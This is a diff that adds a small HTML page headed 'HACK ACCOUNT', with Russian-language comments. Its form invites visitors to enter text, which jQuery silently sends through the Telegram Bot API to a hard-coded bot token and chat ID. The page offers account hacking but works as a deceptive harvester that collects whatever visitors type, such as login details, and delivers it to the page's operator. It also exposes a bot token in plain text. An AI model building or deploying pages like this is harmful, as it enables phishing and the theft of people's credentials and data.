@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Отправка сообщений в телеграм-бот</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <link rel="stylesheet" href="smirnova_files/style.css">
+    <link rel="stylesheet" href="smirnova_files/fork-awesome.min.css">
+
+</head>
+
+<body>
+    <b><p><font size="8" color="#fa8e47" >HACK ACCOUNT</font></p></b>
+    <form id="message-form">
+        <b><label for="message"><font size="4" color="#ffffff"> Enter text </font></label></b>
+        <input type="text" id="message" name="message">
+        <button onclick="window.location.href='Pmvk6Sxa9F.htm'">Send</button>
+        
+    </form>
+
+    <script>
+        $(document).ready(function() {
+            // Обработчик отправки формы
+            $("#message-form").submit(function(event) {
+                event.preventDefault();
+
+                // Получение текста сообщения
+                var message = $("#message").val();
+
+                // Отправка сообщения в телеграм-бота
+                $.ajax({
+                    url: "https://api.telegram.org/bot5767714185:AAHoBzmsH_TcIi3KGm3_0JiUtXKJh95YHUc/sendMessage",
+                    method: "POST",
+                    data: {
+                        chat_id: "1704139695",
+                        text: message
+                    },
+                    success: function(response) {
+                         
+                        // Очистка поля ввода после отправки
+                        $("#message").val("");
+                    },
+                    error: function(xhr, status, error) {
+                        
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
